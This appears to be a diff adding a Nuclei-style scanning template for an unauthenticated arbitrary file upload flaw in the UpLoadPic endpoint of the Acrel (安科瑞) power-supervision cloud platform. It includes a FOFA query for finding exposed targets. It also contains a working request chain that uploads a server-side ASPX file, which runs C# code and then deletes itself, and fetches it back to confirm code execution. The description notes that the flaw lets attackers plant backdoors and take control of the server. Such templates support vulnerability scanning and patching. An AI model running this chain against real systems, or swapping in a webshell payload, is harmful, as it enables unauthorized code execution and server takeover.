@@ -1,0 +1,50 @@
+id: ankerui-UpLoadPic-File-upload
+
+info:
+  name: 安科瑞环保用电监管云平台 UpLoadPic 任意文件上传漏洞
+  author: unknown
+  severity: high
+  description: |-
+    fofa: body="myCss/phone.css"
+    安科瑞环保用电监管云平台 UpLoadPic 接口存在文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+
+  tags: File upload
+
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+  
+http:
+  - raw:
+      - |
+        POST /Enterprise/UpLoadPic HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryRDazwgc1RnTaskmR
+
+        ------WebKitFormBoundaryRDazwgc1RnTaskmR
+        Content-Disposition: form-data; name="file"; filename="{{username}}.aspx"
+
+        <%@Page Language="C#"%><%Response.Write("sectestsectest");System.IO.File.Delete(Request.PhysicalPath);%>
+        ------WebKitFormBoundaryRDazwgc1RnTaskmR--
+    extractors:
+       - type: regex 
+         part: body
+         name: uploadfile
+         group: 1
+         regex:
+           - '([a-zA-Z0-9-]+\.aspx)'
+         internal: true
+  - raw:
+      - |
+        GET /UpLoad/Temp/{{uploadfile}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'sectestsectest'
+      - type: status
+        status: 
+          - 200
